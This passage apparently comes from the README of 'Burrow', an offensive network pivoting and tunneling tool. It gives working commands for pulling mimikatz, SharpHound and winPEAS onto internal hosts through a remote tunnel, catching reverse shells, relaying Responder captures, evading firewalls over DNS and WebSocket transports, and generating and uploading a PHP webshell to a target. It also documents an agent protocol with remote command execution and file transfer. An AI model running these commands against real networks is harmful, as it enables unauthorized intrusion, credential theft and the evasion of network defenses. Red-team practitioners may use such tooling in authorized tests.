#    connections back to 127.0.0.1:6969 on the OPERATOR's machine
tunnel add remote 0.0.0.0:6969 127.0.0.1:6969

# 6. From any internal machine (e.g., 10.10.10.15 via evil-winrm):
wget http://10.10.10.5:6969/tools/winPEASx64.exe
curl http://10.10.10.5:6969/tools/SharpHound.exe -o SharpHound.exe
certutil -urlcache -split -f http://10.10.10.5:6969/tools/mimikatz.exe C:\Users\Public\mimikatz.exe
```

**Multiple remote tunnels:** You can stack them. Each gets its own listener on the pivot.

```bash
# Serve files on port 6969
tunnel add remote 0.0.0.0:6969 127.0.0.1:6969

# Forward Responder/Inveigh captures back on port 445
tunnel add remote 0.0.0.0:8445 127.0.0.1:445

# Reverse shell catcher
tunnel add remote 0.0.0.0:4444 127.0.0.1:4444
```

**Key distinction from local tunnels:**
- **Local tunnel** (`tunnel add local`): Operator listens locally, forwards to agent's network. Use for reaching internal services.
- **Remote tunnel** (`tunnel add remote`): Agent listens on pivot, forwards back to operator. Use for serving files, catching shells, receiving data from internal hosts.

### Standalone Port Forwarding

```bash
# No agent needed. Forward local port to internal host.
burrow tunnel local --listen 127.0.0.1:8080 --remote internal.host:80
```

### Pivot Chain Through Multiple Hosts

```bash
# Chain through two intermediate hops to reach final target
# Opens local port 1080 as entry point
burrow pivot --target final.host --port 443 --hop hop1:22 --hop hop2:443 --local-port 1080
```

### Firewall Evasion with WebSocket Transport

```bash
# Operator: listen on 443 with WebSocket transport
burrow server --transport ws --listen 0.0.0.0:443 --mcp-api

# Target: connect back using WebSocket
burrow agent --connect operator.com:443 --transport ws --fp AB:CD:EF:01:23:45:67:89
```

### DNS Tunnel Through Restrictive Network

```bash
# Operator: DNS tunnel server on port 53
burrow server --transport dns --listen 0.0.0.0:53

# Target: connect via DNS
burrow agent --connect operator.com:53 --transport dns
```

### SOCKS5 Proxy for Tool Routing

```bash
# Start SOCKS5 proxy
burrow proxy socks5 --listen 127.0.0.1:1080

# Route tools through it
curl --socks5 127.0.0.1:1080 http://10.0.0.5/admin
proxychains nmap -sT -p 22,80,443 10.0.0.0/24
```

### HTTP Tunnel Through Egress-Blocked Host

```bash
# Scenario: Target has no outbound connectivity, but you can reach port 8080

# Option A: Deploy Burrow binary on target
# On target:
burrow tunnel server -l 0.0.0.0:8080 -k s3cret

# On attacker:
burrow tunnel client -c http://target:8080/b -k s3cret -l 127.0.0.1:1080
proxychains nmap -sT -Pn 10.10.10.0/24

# Option B: Upload a webshell instead of a binary
# On attacker:
burrow generate webshell --format php --key s3cret -o tunnel.php
# Upload tunnel.php to target web root

# On attacker:
burrow tunnel client -c http://target/tunnel.php -k s3cret -l 127.0.0.1:1080
proxychains nmap -sT -Pn 10.10.10.0/24
```

---

### Complete Multi-Hop Pivot Workflow

A step-by-step example pivoting through two hops to reach an isolated internal network.

#### Step 1: Enumerate the first network

```bash
# Scan the first network from the operator machine
burrow scan --subnet 10.0.0.0/24 --ports 22,80,443,3389,8080
```

#### Step 2: Drop agent on hop1

```bash
# Operator: start server
burrow server --webui
# Note the fingerprint and token

# On hop1 (10.0.0.5): deploy and run agent
burrow agent --connect OPERATOR_IP:11601 --fp AB:CD:EF:01:23:45:67:89
```

#### Step 3: Scan internal network through hop1

```bash
# Add a route through the hop1 session so operator can reach 192.168.1.0/24
burrow session use SESSION_HOP1 --token <api-token>
burrow> route add 192.168.1.0/24

# Now scan the internal network (traffic routes through the agent)
burrow scan --subnet 192.168.1.0/24 --ports 22,80,443,3306,5432
```

#### Step 4: Set up pivot chain through hop1 to hop2

```bash
# Chain: operator -> hop1 (10.0.0.5:22) -> hop2 (192.168.1.20:22) -> final target
burrow pivot --target 172.16.0.0 --port 443 \
  --hop 10.0.0.5:22 \
  --hop 192.168.1.20:22 \
  --local-port 1080
```

#### Step 5: Open SOCKS5 through the chain

```bash
# The --local-port 1080 above already opens a SOCKS5 entry point.
# Alternatively, start a dedicated SOCKS5 proxy:
burrow proxy socks5 --listen 127.0.0.1:1080
```

#### Step 6: Run tools through proxychains

```bash
# Configure proxychains to use 127.0.0.1:1080
# /etc/proxychains4.conf: socks5 127.0.0.1 1080

proxychains nmap -sT -p 22,80,443,3306 172.16.0.0/24
proxychains curl http://172.16.0.10/admin
proxychains ssh user@172.16.0.10
```

## WebUI Dashboard

Enabled with `--webui` on the server. The server defaults to HTTPS with a self-signed certificate. On startup, the WebUI URL is printed with the API token embedded as a query parameter for easy browser access.

Built with Alpine.js and Pico CSS. Provides a live session list, tunnel management, and route management. The `GET /api/events` endpoint is a Server-Sent Events stream for live updates.

The `session` CLI commands (`list`, `info`, `use`) default to HTTPS and require `--token` for authentication. Use `--no-tls` if running the WebUI without TLS.

### REST API

> **Note:** The REST API is designed exclusively for MCP (Model Context Protocol) server integration. It is NOT intended for general use. Use the CLI (`session use`) or TUI (`--tui`) for interactive session management.

**Authentication:** 
The REST API is only enabled when --mcp-api is passed. It enforces HTTP Bearer token authentication. Requests must include the automatically generated token (or the token explicitly passed via `--api-token`) in the headers:
`Authorization: Bearer <token>`

All endpoints return JSON.

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/api/sessions` | List all sessions |
| `GET` | `/api/sessions/{id}` | Get session details |
| `GET` | `/api/sessions/{id}/tunnels` | List tunnels for session |
| `POST` | `/api/sessions/{id}/tunnels` | Create tunnel |
| `DELETE` | `/api/sessions/{id}/tunnels/{tid}` | Remove tunnel |
| `GET` | `/api/sessions/{id}/routes` | List routes for session |
| `POST` | `/api/sessions/{id}/routes` | Add route |
| `DELETE` | `/api/sessions/{id}/routes/{cidr}` | Remove route |
| `GET` | `/api/events` | SSE event stream for live updates |
| `POST` | `/api/sessions/{id}/tun` | Start TUN interface |
| `DELETE` | `/api/sessions/{id}/tun` | Stop TUN interface |

**Create tunnel (POST body):**

```json
{
  "direction": "local",
  "listen": "127.0.0.1:8080",
  "remote": "10.0.0.5:80",
  "protocol": "tcp"
}
```

**Add route (POST body):**

```json
{
  "cidr": "10.0.0.0/24"
}
```

**Example curl usage (Replace <token> with generated API key):**

```bash
# List sessions
curl -k -H "Authorization: Bearer <token>" https://127.0.0.1:9090/api/sessions

# Create a tunnel
curl -k -X POST https://127.0.0.1:9090/api/sessions/session-abc123/tunnels \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"direction":"local","listen":"127.0.0.1:8080","remote":"10.0.0.5:80","protocol":"tcp"}'

# Add a route
curl -k -X POST https://127.0.0.1:9090/api/sessions/session-abc123/routes \
  -H "Authorization: Bearer <token>" \
  -H 'Content-Type: application/json' \
  -d '{"cidr":"10.0.0.0/24"}'

# Remove a tunnel
curl -k -X DELETE https://127.0.0.1:9090/api/sessions/session-abc123/tunnels/tun-001 \
  -H "Authorization: Bearer <token>"

# Remove a route
curl -k -X DELETE https://127.0.0.1:9090/api/sessions/session-abc123/routes/10.0.0.0%2F24 \
  -H "Authorization: Bearer <token>"

# Subscribe to live events
curl -k -H "Authorization: Bearer <token>" https://127.0.0.1:9090/api/events
```

---

## Security Model

**TLS:** The server auto-generates a self-signed Ed25519 certificate on startup. The SHA256 fingerprint of the certificate DER is printed to stdout. Pass it to agents with `--fp AB:CD:...` for verification. Prefix matching is supported — the first 8 bytes are sufficient (shown in TUI banner).

**Frame encryption:** Each frame is encrypted independently using X25519 ECDH key exchange, HKDF-SHA256 key derivation, and ChaCha20-Poly1305 or AES-256-GCM AEAD. A 4-byte counter provides anti-replay protection. Keys rotate hourly.

**WebSocket mode:** TLS over HTTPS. Traffic is indistinguishable from normal HTTPS to network observers.

**No plaintext fallback:** Unless `--no-tls` is explicitly passed, all connections use TLS. Fingerprint verification is opt-in but strongly recommended.

---

## Python Companion

The Python package provides an MCP server integration and a FastAPI web dashboard that securely proxies instructions to the compiled Go binary. 

```bash
# Install from project root
pip install -e .
```

This installs:
- `burrow` CLI command (Python execution wrapper around the Go binary)
- `burrow.mcp_server` module for MCP integration
- `burrow.web` FastAPI proxy (Set `BURROW_API_TOKEN` and `BURROW_API_URL` to route correctly to the Go dashboard)

Dependencies: click, rich, pyyaml, pydantic, cryptography, fastapi, uvicorn.

---

## Architecture

```
cmd/burrow/cmd/          CLI (cobra) + TUI (bubbletea)
internal/
  transport/             Transport interface + registry (raw, ws, dns, icmp, http)
  crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM
  proxy/                 SOCKS5 + HTTP forward proxy with session routing
  httptunnel/            HTTP tunnel relay (basic + secure modes, server + client + protocol)
    webshell/            Webshell generator (PHP/ASPX/JSP templates)
  tunnel/                Local, remote, and reverse TCP forwarders
  relay/                 Socat-style bidirectional relay
  pivot/                 Multi-hop chain orchestration
  discovery/             Ping sweep + port scanner
  certgen/               Self-signed TLS cert generation (Ed25519) + fingerprint
  mux/                   yamux stream multiplexer for agent sessions
  protocol/              Binary message protocol (12 types, JSON payloads)
  session/               Agent session manager + proxy server + web.SessionProvider
  tun/                   TUN interface with magic IP 240.0.0.0/4 routing
  netstack/              gvisor userspace TCP/IP for agent-side packet termination
  udp/                   UDP port forwarder
  web/                   Embedded WebUI (Alpine.js + Pico CSS) with REST API + SSE
```

---

### TUI Dashboard (`--tui` flag)

Interactive terminal UI dashboard built with bubbletea. Provides a full-screen interface for managing sessions, tunnels, routes, and TUN interfaces without needing to remember CLI flags or API endpoints.

Enabled by passing `--tui` to `burrow server`. When combined with `--webui`, the TUI header displays a clickable link to the WebUI.

**Example:**

```bash
# Start server with TUI dashboard
burrow server --tui

# TUI with WebUI (TUI header shows WebUI link)
burrow server --tui --webui

# TUI with all features
burrow server --tui --webui --mcp-api
```

**Keybindings -- Session List:**

| Key | Action |
|-----|--------|
| `↑` / `k` | Move cursor up |
| `↓` / `j` | Move cursor down |
| `g` / `G` | Jump to top / bottom |
| `Enter` | Enter session detail view |
| `Ctrl+T` | Toggle TUN on/off for selected session |
| `Ctrl+A` | Toggle TAP on/off for selected session |
| `y` | Copy session ID to clipboard |
| `Y` | Copy server fingerprint to clipboard |
| `F` | Copy server fingerprint (short) |
| `l` | Set session label |
| `E` | Export engagement data (JSON) |
| `T` | Show network topology view |
| `?` | Show help overlay |
| `Ctrl+Q` | Quit |

**Keybindings -- Session Detail:**

| Key | Action |
|-----|--------|
| `q` / `Esc` | Back to session list |
| `Tab` | Switch between Tunnels and Routes tabs |
| `↑` / `↓` | Move cursor up / down |
| `g` / `G` | Jump to top / bottom |
| `t` | Open add tunnel form |
| `r` | Open add route form |
| `u` | Start selected tunnel |
| `Ctrl+N` | Stop selected tunnel |
| `Ctrl+D` | Delete selected tunnel/route |
| `x` | Execute command on agent |
| `w` | Download file from agent |
| `p` | Upload file to agent |
| `o` | View exec history |
| `n` | Open new scan form |
| `N` | View scan results |
| `C` | SOCKS5 chain builder |
| `P` | Tunnel profiles (save/load) |
| `Y` | Copy tunnel/route data |
| `y` | Copy session ID |
| `F` | Copy server fingerprint (short) |
| `Ctrl+T` | Start TUN (prompts for route) / Stop TUN |
| `Ctrl+A` | Start TAP (prompts for IP) / Stop TAP |
| `Ctrl+S` | Toggle SOCKS5 proxy |
| `Ctrl+K` | Kill session (tear down all infrastructure) |
| `?` | Show help overlay |

**Keybindings -- Forms (Add Tunnel / Add Route):**

| Key | Action |
|-----|--------|
| `Tab` / `↓` | Next field |
| `Shift+Tab` / `↑` | Previous field |
| `Space` / `←` / `→` | Toggle direction (local/remote) or protocol (tcp/udp) |
| `Enter` | Submit |
| `Esc` | Cancel |

---

## Protocol Reference

Binary frame format:

```
[type: 1 byte][length: 4 bytes big-endian][payload: length bytes]
```

Max payload: 1 MB. All structured payloads are JSON-encoded.

| Type | Hex | Direction | Description |
|------|-----|-----------|-------------|
| Handshake | `0x01` | Agent -> Server | Agent identification: hostname, OS, IPs, PID, version |
| HandshakeAck | `0x02` | Server -> Agent | Session ID assignment |
| TunnelRequest | `0x10` | Server -> Agent | Create a tunnel |
| TunnelAck | `0x11` | Agent -> Server | Tunnel creation result |
| TunnelClose | `0x12` | Either | Close a tunnel |
| RouteAdd | `0x20` | Server -> Agent | Add a network route |
| RouteRemove | `0x21` | Server -> Agent | Remove a network route |
| ListenerRequest | `0x30` | Server -> Agent | Create a listener |
| ListenerAck | `0x31` | Agent -> Server | Listener creation result |
| Ping | `0x40` | Server -> Agent | Keepalive request |
| Pong | `0x41` | Agent -> Server | Keepalive response |
| TunStart | `0x50` | Server -> Agent | Activate TUN mode on agent |
| TunStartAck | `0x51` | Agent -> Server | TUN activation result |
| TunStop | `0x52` | Server -> Agent | Deactivate TUN mode |
| ExecRequest | `0x60` | Server -> Agent | Remote command execution |
| ExecResponse | `0x61` | Agent -> Server | Command output |
| FileDownloadRequest | `0x70` | Server -> Agent | Download file from agent |
| FileDownloadResponse | `0x71` | Agent -> Server | File data |
| FileUploadRequest | `0x72` | Server -> Agent | Upload file to agent |
| FileUploadResponse | `0x73` | Agent -> Server | Upload confirmation |
| Error | `0xFF` | Either | Error message |

---

## Testing

```bash
go test ./...
```

24 packages, all passing.

---

## Tech Stack

| Package | Purpose |
|---------|---------|
| Go 1.24+ | Runtime |
| github.com/spf13/cobra | CLI framework |
| golang.org/x/crypto | X25519, ChaCha20-Poly1305, HKDF |
| github.com/hashicorp/yamux | Stream multiplexing for agent sessions |
| nhooyr.io/websocket | WebSocket transport |
| github.com/songgao/water | TUN interface |
| github.com/nicocha30/gvisor-ligolo | Userspace TCP/IP netstack |
| github.com/charmbracelet/bubbletea | Terminal UI framework |
| github.com/charmbracelet/lipgloss | Terminal styling |
| github.com/charmbracelet/bubbles | UI component library |
| github.com/miekg/dns | DNS tunnel transport |
| golang.org/x/net | ICMP transport |

---

## Acknowledgments

Burrow builds on ideas and techniques from several projects whose work deserves recognition:

- **[ligolo-ng](https://github.com/nicocha30/ligolo-ng)** by Nicolas Music — The TUN mode architecture, magic IP routing via the 240.0.0.0/4 reserved range, and the approach of using a userspace netstack on the agent side to terminate IP packets without kernel module dependencies. ligolo-ng demonstrated that a Go-based tunneling tool could provide full IP-level pivoting with a clean agent/server model.

- **[gvisor](https://github.com/google/gvisor)** by Google — The userspace TCP/IP stack that powers TUN mode's agent-side packet processing. Burrow uses the [gvisor-ligolo](https://github.com/nicocha30/gvisor-ligolo) fork maintained by the ligolo-ng author.

- **[reGeorg](https://github.com/sensepost/reGeorg)** by SensePost and **[Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)** by L — The HTTP tunnel transport design, where traffic is encapsulated in HTTP POST requests to traverse restrictive egress filtering. Burrow's `tunnel` module follows this pattern in basic mode. The secure mode (`-s`) draws from **[pivotnacci](https://github.com/blackarrowsec/pivotnacci)** by BlackArrow for AES-encrypted, cookie-based command encoding that evades WAFs and DPI.

- **[chisel](https://github.com/jpillora/chisel)** by Jaime Pillora — Reverse tunnel architecture and the concept of a single binary that handles both client and server roles with multiplexed connections over HTTP.

- **[yamux](https://github.com/hashicorp/yamux)** by HashiCorp — The session multiplexer that allows a single agent connection to carry many concurrent streams (tunnels, SOCKS5, TUN, TAP, file transfers) without head-of-line blocking.

- **[water](https://github.com/songgao/water)** by Song Gao — Cross-platform TUN/TAP interface library used for both the TUN and TAP virtual network devices.

- **[Charm](https://github.com/charmbracelet)** — The bubbletea, lipgloss, and bubbles libraries that power the interactive TUI.
